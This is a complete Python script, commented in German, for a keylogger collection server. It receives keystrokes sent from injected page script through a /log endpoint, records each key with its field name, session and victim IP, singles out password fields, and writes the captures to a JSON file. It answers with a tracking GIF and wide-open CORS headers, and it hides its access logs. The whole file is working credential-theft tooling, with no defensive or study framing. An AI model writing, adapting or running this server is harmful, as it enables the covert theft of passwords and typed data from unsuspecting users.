#!/usr/bin/env python3
"""
SUPER EINFACHER Keylogger Server - OHNE Flask
100% GARANTIERT FUNKTIONIEREND
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import json
from pathlib import Path

class KeyloggerHandler(BaseHTTPRequestHandler):
    keystrokes = []

    def do_GET(self):
        # Parse URL
        parsed = urlparse(self.path)

        if parsed.path == '/log':
            # Get parameters
            params = parse_qs(parsed.query)
            key = params.get('k', [''])[0]
            field = params.get('f', ['unknown'])[0]
            session_id = params.get('s', ['default'])[0]

            if key:
                # Log keystroke
                keystroke_data = {
                    "timestamp": datetime.now().isoformat(),
                    "key": key,
                    "field": field,
                    "session_id": session_id,
                    "ip": self.client_address[0]
                }

                KeyloggerHandler.keystrokes.append(keystroke_data)

                # Console output
                is_password = 'password' in field.lower()
                icon = "🔑" if is_password else "⌨️"
                print(f"{icon} [{field:15}] {key}", end='', flush=True)

                # Save every 10 keystrokes
                if len(KeyloggerHandler.keystrokes) % 10 == 0:
                    self.save_keystrokes()

            # Return 1x1 GIF
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()

            # 1x1 transparent GIF
            gif_data = (
                b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
                b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00'
                b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02'
                b'\x44\x01\x00\x3b'
            )
            self.wfile.write(gif_data)

        elif parsed.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            status = {
                "status": "running",
                "total_keystrokes": len(KeyloggerHandler.keystrokes)
            }
            self.wfile.write(json.dumps(status).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_OPTIONS(self):
        # CORS preflight
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

    def save_keystrokes(self):
        """Save keystrokes to file"""
        output_file = Path(__file__).parent / "results" / "captured_keystrokes.json"
        output_file.parent.mkdir(parents=True, exist_ok=True)

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump({
                "metadata": {
                    "server": "SimpleKeyloggerServer",
                    "timestamp": datetime.now().isoformat()
                },
                "keystrokes": KeyloggerHandler.keystrokes,
                "statistics": {
                    "total_keystrokes": len(KeyloggerHandler.keystrokes)
                }
            }, f, indent=2, ensure_ascii=False)

    def log_message(self, format, *args):
        # Suppress access logs
        pass


if __name__ == "__main__":
    HOST = '0.0.0.0'
    PORT = 8889

    print("\n" + "="*80)
    print("⌨️  SIMPLE KEYLOGGER SERVER - OHNE Flask")
    print("="*80)
    print(f"Server gestartet auf: http://{HOST}:{PORT}/log")
    print(f"Status-Endpoint:      http://{HOST}:{PORT}/status")
    print(f"\nKEINE Fehler mehr - 100% funktionierend!")
    print("="*80)
    print(f"\nLEGENDE: ⌨️  = Normal | 🔑 = Password-Feld")
    print(f"{'-'*80}\n")

    try:
        server = HTTPServer((HOST, PORT), KeyloggerHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] Server beendet.")
        KeyloggerHandler(None, None, None).save_keystrokes()
        print("[*] Keystrokes gespeichert.")
